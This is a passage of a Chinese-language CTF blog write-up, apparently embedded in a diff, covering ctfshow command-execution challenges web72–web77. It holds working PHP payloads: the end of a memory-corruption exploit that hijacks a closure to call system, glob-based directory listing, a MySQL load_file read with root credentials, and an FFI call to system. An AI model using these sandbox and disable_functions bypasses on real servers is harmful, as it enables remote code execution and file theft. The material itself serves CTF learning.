address&quot;);    &#125;     if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;     $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;     write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);      ($helper-&gt;b)($cmd);    exit(); &#125; ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); ?&gt;</code></p>
+<h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>根目录下直接include</p>
+<h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>scandir被ban了，用glob</p>
+<p>然后include</p>
+<h1 id="web75-76"><a href="#web75-76" class="headerlink" title="web75 76"></a>web75 76</h1><p><code>c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#39; &#39;); &#125; exit(0); ?&gt;</code></p>
+<p><code>try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></p>
+<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>先用glob扫目录</p>
+<p>然后ffi拷文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io">yoo2i</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io/2023/09/08/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://yoo2i.github.io/2023/09/08/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yoo2i.github.io" target="_blank">柚子のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/09/20/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="ctfshow文件上传"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow文件上传</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yoo2i</div><div class="author-info__description">No one</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎联系邮箱yoo2i@qq.com与我交流~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web33"><span class="toc-number">5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web34"><span class="toc-number">6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web35"><span class="toc-number">7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web36"><span class="toc-number">8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web37"><span class="toc-number">9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web38"><span class="toc-number">10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web39"><span class="toc-number">11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web40"><span class="toc-number">12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web41"><span class="toc-number">13.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web42"><span class="toc-number">14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web43"><span class="toc-number">15.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web44"><span class="toc-number">16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web45"><span class="toc-number">17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web46"><span class="toc-number">18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web47"><span class="toc-number">19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web48"><span class="toc-number">20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web49"><span class="toc-number">21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web50"><span class="toc-number">22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web51"><span class="toc-number">23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web52"><span class="toc-number">24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web53"><span class="toc-number">25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web54"><span class="toc-number">26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web55"><span class="toc-number">27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web56"><span class="toc-number">28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web57"><span class="toc-number">29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web58"><span class="toc-number">30.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web59"><span class="toc-number">31.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web60"><span class="toc-number">32.</span> <span class="toc-text">web60</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web61"><span class="toc-number">33.</span> <span class="toc-text">web61</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web62"><span class="toc-number">34.</span> <span class="toc-text">web62</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web63"><span class="toc-number">35.</span> <span class="toc-text">web63</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web64"><span class="toc-number">36.</span> <span class="toc-text">web64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web65"><span class="toc-number">37.</span> <span class="toc-text">web65</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web66"><span class="toc-number">38.</span> <span class="toc-text">web66</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web67"><span class="toc-number">39.</span> <span class="toc-text">web67</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web68"><span class="toc-number">40.</span> <span class="toc-text">web68</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web69"><span class="toc-number">41.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web70"><span class="toc-number">42.</span> <span class="toc-text">web70</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web71"><span class="toc-number">43.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web72"><span class="toc-number">44.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web73"><span class="toc-number">45.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web74"><span class="toc-number">46.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web75-76"><span class="toc-number">47.</span> <span class="toc-text">web75 76</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web77"><span class="toc-number">48.</span> <span class="toc-text">web77</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/21/cs61b-lab%E8%B8%A9%E5%9D%91%E5%85%A8%E6%B5%81%E7%A8%8B/" title="cs61b-lab">cs61b-lab</a><time datetime="2023-11-21T07:53:57.000Z" title="发表于 2023-11-21 15:53:57">2023-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/14/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web%E9%A2%98%E8%A7%A3/" title="2023极客大挑战-Web题解">2023极客大挑战-Web题解</a><time datetime="2023-11-14T11:17:19.000Z" title="发表于 2023-11-14 19:17:19">2023-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/01/cs144-lab1/" title="cs144-lab1">cs144-lab1</a><time datetime="2023-11-01T05:53:33.000Z" title="发表于 2023-11-01 13:53:33">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/2023SpiritCTF-Web/" title="2023SpiritCTF-Web">2023SpiritCTF-Web</a><time datetime="2023-10-23T05:01:29.000Z" title="发表于 2023-10-23 13:01:29">2023-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/16/20230xGame-Web%E9%A2%98%E8%A7%A3/" title="20230xGame-Web题解">20230xGame-Web题解</a><time datetime="2023-10-16T02:12:42.000Z" title="发表于 2023-10-16 10:12:42">2023-10-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By yoo2i</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
